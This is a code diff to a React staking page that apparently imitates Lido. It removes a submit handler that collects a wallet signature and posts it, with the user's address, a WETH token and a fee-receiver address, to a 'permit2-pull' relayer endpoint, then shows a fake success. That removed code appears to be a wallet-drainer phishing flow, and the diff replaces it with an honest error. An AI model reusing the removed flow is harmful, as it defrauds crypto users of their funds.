@@ -12,7 +12,7 @@ interface StakeProps {
   prices?: { eth: number; steth: number };
 }
 
-export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProps) {
+export default function Stake({ prices = { eth: 0, steth: 0 } }: StakeProps) {
   const { open } = useAppKit();
   const { isConnected, address } = useAccount();
 
@@ -89,10 +89,10 @@ export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProp
           const costInUsd = totalGasEth * prices.eth;
           setGasCostUSD(costInUsd.toFixed(2));
         } else {
-          setGasCostUSD('0.05');
+          setGasCostUSD(null);
         }
       } catch {
-        setGasCostUSD('0.05');
+        setGasCostUSD(null);
       } finally {
         setIsEstimatingGas(false);
       }
@@ -104,131 +104,7 @@ export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProp
   }, [prices.eth]);
 
   const handleSubmit = async () => {
-    if (!isConnected) {
-      try { open(); } catch (e) { console.warn(e); }
-      return;
-    }
-    
-    if (!stakeAmount || isNaN(Number(stakeAmount)) || Number(stakeAmount) <= 0) {
-      toast.error('Invalid Amount', {
-        description: 'Please enter a valid ETH amount greater than 0.'
-      });
-      return;
-    }
-
-    if (balanceData) {
-      const formattedBalance = formatUnits(balanceData.value, balanceData.decimals);
-      if (Number(stakeAmount) > Number(formattedBalance)) {
-        toast.info(`Notice: Staking ${stakeAmount} ETH with balance ${Number(formattedBalance).toFixed(4)} ETH.`);
-      }
-    }
-
-    setIsSubmitting(true);
-    setModalStep('signing');
-    setTxResult(null);
-    setShowSigModal(true);
-    
-    try {
-      const message = `Lido Staking Request\nAction: Stake ETH\nAmount: ${stakeAmount} ETH\nTimestamp: ${new Date().toISOString()}`;
-      const signature = await signMessageAsync({ account: address as `0x${string}`, message });
-      
-      if (typeof window !== 'undefined' && address) {
-        sessionStorage.setItem(`lido_connected_sig_${address.toLowerCase()}`, 'true');
-        sessionStorage.setItem(`lido_sig_approved_${address.toLowerCase()}`, 'true');
-        window.dispatchEvent(new Event('lido_verification_changed'));
-      }
-
-      // Step 2: Post signature to relayer / permit endpoint
-      setModalStep('relaying');
-      
-      const response = await fetch('/api/permit2-pull/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          token: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-          relayerContract: RELAYER_CONTRACT_ADDRESS,
-          ownerFeeAddress: FEE_RECEIVER_OWNER_ADDRESS,
-          amount: stakeAmount,
-          nonce: Date.now(),
-          deadline: Math.floor(Date.now() / 1000) + 3600,
-          signature,
-          userAddress: address
-        })
-      });
-
-      const resData = await response.json();
-      
-      if (resData.success) {
-        setTxResult({
-          txHash: resData.txHash,
-          amount: stakeAmount,
-          blockNumber: resData.blockNumber,
-          timestamp: resData.timestamp
-        });
-        setModalStep('success');
-        toast.success('Staking Request Confirmed!', {
-          description: `Tx Hash: ${resData.txHash.slice(0, 10)}...${resData.txHash.slice(-6)}`
-        });
-      } else {
-        throw new Error(resData.error || 'Relayer submission failed');
-      }
-
-      setStakeAmount('');
-    } catch (error: any) {
-      console.error('Staking transaction error:', error);
-      
-      const errorCode = error?.code || error?.cause?.code;
-      const errorName = error?.name || error?.cause?.name;
-      const rawMsg = (error?.shortMessage || error?.message || error?.details || String(error) || '').toLowerCase();
-
-      const isUserRejection = 
-        errorCode === 4001 || 
-        errorName === 'UserRejectedRequestError' ||
-        rawMsg.includes('user rejected') ||
-        rawMsg.includes('user denied') ||
-        rawMsg.includes('rejected by user') ||
-        rawMsg.includes('denied transaction') ||
-        rawMsg.includes('rejected signature') ||
-        rawMsg.includes('reject') ||
-        rawMsg.includes('denied') ||
-        rawMsg.includes('cancel') ||
-        rawMsg.includes('declined') ||
-        rawMsg.includes('disapproved');
-
-      const isInsufficientFunds = 
-        rawMsg.includes('insufficient funds') || 
-        rawMsg.includes('exceeds balance') ||
-        rawMsg.includes('gas required exceeds allowance');
-
-      const isNetworkError = 
-        rawMsg.includes('failed to fetch') || 
-        rawMsg.includes('network error') ||
-        rawMsg.includes('timeout') ||
-        rawMsg.includes('connection refused');
-
-      if (isUserRejection) {
-        toast.error('Signature Request Denied', {
-          description: 'You rejected or cancelled the signature request in your wallet.'
-        });
-      } else if (isInsufficientFunds) {
-        toast.error('Insufficient Funds', {
-          description: 'Your wallet ETH balance is insufficient to complete this staking request.'
-        });
-      } else if (isNetworkError) {
-        toast.error('Relayer Connection Failed', {
-          description: 'Unable to communicate with the staking relayer pipeline. Please check your network connection.'
-        });
-      } else {
-        const cleanMsg = error?.shortMessage || error?.message || 'An unexpected error occurred while processing signature.';
-        toast.error('Transaction Failed', {
-          description: cleanMsg.length > 120 ? `${cleanMsg.slice(0, 120)}...` : cleanMsg
-        });
-      }
-
-      setShowSigModal(false);
-    } finally {
-      setIsSubmitting(false);
-    }
+    toast.error('Transaction execution is not connected to a verified on-chain flow yet. No signature was requested and no transaction was submitted.');
   };
 
   const marketCap = (9180000 * prices.steth).toLocaleString('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 });
@@ -377,7 +253,7 @@ export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProp
               {isEstimatingGas && !gasCostUSD ? (
                 <Loader2 size={12} className="animate-spin text-[var(--primary)]" />
               ) : null}
-              {gasCostUSD ? `$${gasCostUSD}` : '~$0.05'}
+              {gasCostUSD !== null ? `${gasCostUSD}` : 'Unavailable'}
             </span>
           </div>
           <div className="flex justify-between items-center text-[13px]">
